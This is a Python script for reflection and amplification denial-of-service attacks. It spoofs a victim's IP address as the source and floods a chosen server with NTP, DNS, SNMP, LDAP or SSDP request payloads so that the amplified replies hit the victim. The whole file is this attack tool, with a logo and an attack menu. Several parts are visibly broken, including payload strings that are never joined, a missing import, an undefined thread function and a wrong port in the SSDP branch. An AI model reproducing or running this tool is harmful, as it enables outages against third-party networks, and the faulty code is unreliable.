import sys, time, socket, threading
from pinject import *
from colorama import init, Fore, Back, Style

def cprint(msg, foreground = "black", background = "white"):
    fground = foreground.upper()
    bground = background.upper()
    style = getattr(Fore, fground) + getattr(Back, bground)
    print(style + msg + Style.RESET_ALL)

def func(source_ip, dest_ip, duration, payload, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_header = UDP(random.randint(1, 65535), port, payload).pack(source_ip, dest_ip)
    ip_header = IP(source_ip, dest_ip, udp_header, socket.IPPROTO_UDP).pack()
    timeout = time.time() + duration
    sent = 0
    while 1:
        if time.time() > timeout:
            break;
        else:
            pass;
        sock.sendto(ip_header+udp_header+payload, (dest_ip, port))

def logo():
    cprint('  /$$$$$$$  /$$$$$$              /$$$$$$$ \n'
           ' | $$__  $$| $$__  $$           /$$__  $$ \n'
           ' | $$  \ $$| $$  \ $$  /$$$$$$ | $$  \__/ \n'
           ' | $$  | $$| $$  | $$ /$$__  $$|  $$$$$$  \n'
           ' | $$  | $$| $$  | $$| $$  \ $$ \____  $$ \n'
           ' | $$  | $$| $$  | $$| $$  | $$ /$$  \ $$ \n'
           ' | $$$$$$$/| $$$$$$$/|  $$$$$$/|  $$$$$$/ \n'
           ' |_______/ |_______/  \______/  \______/  \n', 'green', 'black')

def menu():
    logo()
    cprint('1) NTP',  'white', 'black')
    cprint('2) DNS', 'white', 'black')
    cprint('3) SNMP', 'white', 'black')
    cprint('4) LDAP', 'white', 'black')
    cprint('5) SSDP', 'white', 'black')
    
menu()

attack = raw_input('Number: ')

def req():
    global source_ip
    global dest_ip
    global duration
    global numthreads
    source_ip  = socket.gethostbyname(raw_input('Target: '))
    dest_ip  = socket.gethostbyname(raw_input('Server: '))
    duration = int(raw_input('Time: '))
    numthreads = int(raw_input('Threads: '))

if(attack == '1'):
    cprint('NTP', 'blue', 'black')
    req()
    payload = '\x17\x00\x02\x2a'+'\x00'*4
    func(source_ip, dest_ip, duration, payload, 123)
    thread(numthreads, func(source_ip, dest_ip, duration, payload, 123))
elif(attack == '2'):
    cprint('DNS', 'blue', 'black')
    req()
    payload = '{}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
    '{}\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00'
    '\x00\x00\x00\x00\x00\x00'
    func(source_ip, dest_ip, duration, payload, 53)
    thread(numthreads, func(source_ip, dest_ip, duration, payload, 53))
elif(attack == '3'):
    cprint('SNMP', 'blue', 'black')
    req()
    payload = "\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a"
    "\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01"
    "\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65"
    "\x63\x74\x63\x6c\x61\x73\x73\x30\x00\x00"
    "\x00\x30\x84\x00\x00\x00\x0a\x04\x08\x4e"
    "\x65\x74\x6c\x6f\x67\x6f\x6e"
    func(source_ip, dest_ip, duration, payload, 161)
    thread(numthreads, func(source_ip, dest_ip, duration, payload, 161))
elif(attack == '4'): 
    cprint('LDAP', 'blue', 'black')
    req()
    payload = "\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a"
    "\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01"
    "\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65"
    "\x63\x74\x63\x6c\x61\x73\x73\x30\x00\x00"
    "\x00\x30\x84\x00\x00\x00\x0a\x04\x08\x4e"
    "\x65\x74\x6c\x6f\x67\x6f\x6e"
    func(source_ip, dest_ip, duration, payload, 389)
    thread(numthreads, func(source_ip, dest_ip, duration, payload, 389))
elif(attack == '5'):
    cprint('SSDP', 'blue', 'black')
    req()
    payload = 'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
    'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n'
    func(source_ip, dest_ip, duration, payload, 389)
    thread(numthreads, func(source_ip, dest_ip, duration, payload, 1900))


    
